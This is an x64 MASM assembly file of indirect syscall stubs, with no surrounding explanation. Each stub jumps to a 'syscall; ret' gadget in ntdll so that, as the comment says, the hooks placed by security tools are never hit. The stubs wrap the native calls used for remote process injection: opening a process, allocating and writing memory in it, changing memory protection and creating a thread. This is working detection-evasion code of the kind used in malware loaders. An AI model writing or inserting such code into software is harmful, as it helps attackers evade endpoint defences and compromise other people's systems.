; Indirect syscall stubs for x64
; Each stub: mov r10,rcx  /  mov eax,SSN  /  jmp [gadget]
; The gadget points to "syscall; ret" inside ntdll .text — never hooked.

EXTERN Syscall__NtAllocateVirtualMemory_entry_ssn:DWORD
EXTERN Syscall__NtAllocateVirtualMemory_entry_gadget:QWORD
EXTERN Syscall__NtWriteVirtualMemory_entry_ssn:DWORD
EXTERN Syscall__NtWriteVirtualMemory_entry_gadget:QWORD
EXTERN Syscall__NtProtectVirtualMemory_entry_ssn:DWORD
EXTERN Syscall__NtProtectVirtualMemory_entry_gadget:QWORD
EXTERN Syscall__NtCreateThreadEx_entry_ssn:DWORD
EXTERN Syscall__NtCreateThreadEx_entry_gadget:QWORD
EXTERN Syscall__NtOpenProcess_entry_ssn:DWORD
EXTERN Syscall__NtOpenProcess_entry_gadget:QWORD
EXTERN Syscall__NtClose_entry_ssn:DWORD
EXTERN Syscall__NtClose_entry_gadget:QWORD
EXTERN Syscall__NtQueryVirtualMemory_entry_ssn:DWORD
EXTERN Syscall__NtQueryVirtualMemory_entry_gadget:QWORD

.CODE

IndirectNtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, DWORD PTR [Syscall__NtAllocateVirtualMemory_entry_ssn]
    jmp QWORD PTR [Syscall__NtAllocateVirtualMemory_entry_gadget]
IndirectNtAllocateVirtualMemory ENDP

IndirectNtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, DWORD PTR [Syscall__NtWriteVirtualMemory_entry_ssn]
    jmp QWORD PTR [Syscall__NtWriteVirtualMemory_entry_gadget]
IndirectNtWriteVirtualMemory ENDP

IndirectNtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, DWORD PTR [Syscall__NtProtectVirtualMemory_entry_ssn]
    jmp QWORD PTR [Syscall__NtProtectVirtualMemory_entry_gadget]
IndirectNtProtectVirtualMemory ENDP

IndirectNtCreateThreadEx PROC
    mov r10, rcx
    mov eax, DWORD PTR [Syscall__NtCreateThreadEx_entry_ssn]
    jmp QWORD PTR [Syscall__NtCreateThreadEx_entry_gadget]
IndirectNtCreateThreadEx ENDP

IndirectNtOpenProcess PROC
    mov r10, rcx
    mov eax, DWORD PTR [Syscall__NtOpenProcess_entry_ssn]
    jmp QWORD PTR [Syscall__NtOpenProcess_entry_gadget]
IndirectNtOpenProcess ENDP

IndirectNtClose PROC
    mov r10, rcx
    mov eax, DWORD PTR [Syscall__NtClose_entry_ssn]
    jmp QWORD PTR [Syscall__NtClose_entry_gadget]
IndirectNtClose ENDP

IndirectNtQueryVirtualMemory PROC
    mov r10, rcx
    mov eax, DWORD PTR [Syscall__NtQueryVirtualMemory_entry_ssn]
    jmp QWORD PTR [Syscall__NtQueryVirtualMemory_entry_gadget]
IndirectNtQueryVirtualMemory ENDP

END